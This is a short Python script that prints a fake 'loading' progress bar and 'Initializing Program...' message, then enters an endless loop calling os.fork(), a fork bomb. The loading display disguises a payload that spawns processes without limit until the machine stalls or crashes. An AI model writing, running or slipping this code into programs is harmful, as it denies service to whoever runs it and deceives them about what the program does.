import time
import sys
from os import fork


for i in range(101):
    print(f"\rloading...{i}%", end="")
    sys.stdout.flush()
    time.sleep(0.05)

print("\n\nInitializing Program...")

while True:
 	fork()
